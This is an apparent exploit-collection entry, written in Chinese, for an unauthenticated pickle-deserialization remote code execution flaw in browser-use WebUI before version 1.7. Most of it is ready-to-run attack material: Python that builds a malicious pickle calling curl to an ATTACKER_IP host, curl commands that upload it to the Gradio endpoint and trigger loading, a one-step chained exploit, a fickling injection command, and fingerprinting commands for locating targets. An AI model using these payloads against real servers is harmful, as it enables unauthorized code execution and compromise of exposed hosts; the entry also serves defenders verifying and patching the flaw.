---
id: BROWSER-USE-PICKLE-RCE
title: browser-use WebUI Pickle 反序列化远程代码执行漏洞
product: browser-use
vendor: browser-use
version_affected: "< 1.7"
severity: CRITICAL
tags: [rce, deserialization, ai, 无需认证]
fingerprint: ["browser-use", "Browser Use", "Gradio"]
---

## 漏洞描述

browser-use WebUI 是基于 browser-use 的 AI Agent 应用，使用 Gradio 框架构建。其 `update_ui_from_config` 接口在加载用户上传的 `.pkl` 配置文件时直接使用 `pickle.load()` 反序列化，未做任何安全校验。攻击者可上传包含恶意代码的 pickle 文件，在服务端实现任意代码执行。

## 影响版本

- browser-use WebUI < 1.7

## 前置条件

- 无需认证（Gradio WebUI 默认无认证）
- 目标 WebUI 端口可访问（默认7788）

## 利用步骤

1. 生成默认配置的 pickle 文件
2. 使用 fickling 或手动构造注入恶意代码到 pickle 文件
3. 通过 Gradio API 上传恶意 pkl 文件
4. 触发配置加载，服务端执行恶意代码

## Payload

### 生成恶意 pickle 文件

```python
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('curl http://ATTACKER_IP/rce_proof',))

with open('malicious.pkl', 'wb') as f:
    pickle.dump(Exploit(), f)
```

### 通过 Gradio API 上传并触发

```bash
# Step 1: 上传恶意 pkl 文件
UPLOAD_RESP=$(curl -s -X POST "http://target:7788/upload" \
  -F "files=@malicious.pkl")
FILE_PATH=$(echo "$UPLOAD_RESP" | python3 -c "import sys,json;print(json.load(sys.stdin)[0])")

# Step 2: 通过 Gradio API 触发配置加载
# 获取 Gradio 组件 fn_index（通常 update_ui_from_config 对应的 API 端点）
curl -s -X POST "http://target:7788/api/predict" \
  -H "Content-Type: application/json" \
  -d "{\"fn_index\":0,\"data\":[{\"name\":\"${FILE_PATH}\",\"orig_name\":\"malicious.pkl\",\"is_file\":true}]}"
```

### 一步式利用（生成 + 上传 + 触发）

```bash
# 在攻击机上生成恶意 pkl
python3 -c "
import pickle,os
class E:
    def __reduce__(self):
        return (os.system, ('curl http://ATTACKER_IP/rce_proof',))
with open('/tmp/mal.pkl','wb') as f:
    pickle.dump(E(),f)
"

# 上传
FILE_PATH=$(curl -s -X POST "http://target:7788/upload" \
  -F "files=@/tmp/mal.pkl" | python3 -c "import sys,json;print(json.load(sys.stdin)[0])")

# 触发
curl -s -X POST "http://target:7788/api/predict" \
  -H "Content-Type: application/json" \
  -d "{\"fn_index\":0,\"data\":[{\"name\":\"${FILE_PATH}\",\"orig_name\":\"config.pkl\",\"is_file\":true}]}"
```

### 使用 fickling 注入（替代方法）

```bash
# 安装 fickling
pip install fickling

# 先生成正常配置文件 default.pkl，再注入恶意代码
fickling --inject "os.system('curl http://ATTACKER_IP/rce_proof')" default.pkl > malicious.pkl
```

## 验证方法

```bash
# 1. 确认 Gradio 服务可访问
curl -s http://target:7788/ | grep -i "gradio\|browser.use"

# 2. OOB 回调验证
# 攻击机: nc -lvp 80
# 上传恶意 pkl 文件后，检查是否收到 /rce_proof 请求

# 3. 检查 Gradio API 是否可用
curl -s http://target:7788/info | python3 -c "import sys,json;print(json.dumps(json.load(sys.stdin),indent=2))" 2>/dev/null | head -20
```

## 指纹确认

```bash
curl -s http://target:7788/ | grep -i "gradio\|browser.use\|Browser Use"
curl -s -o /dev/null -w "%{http_code}" http://target:7788/info
```

## 参考链接

- https://github.com/browser-use/web-ui/commit/7fdf95edaeaf2505b36c10966b7b8d65359f1de6
- https://research.kudelskisecurity.com/2025/04/23/getting-rce-on-browser-use-web-ui-ai-agent-instances/
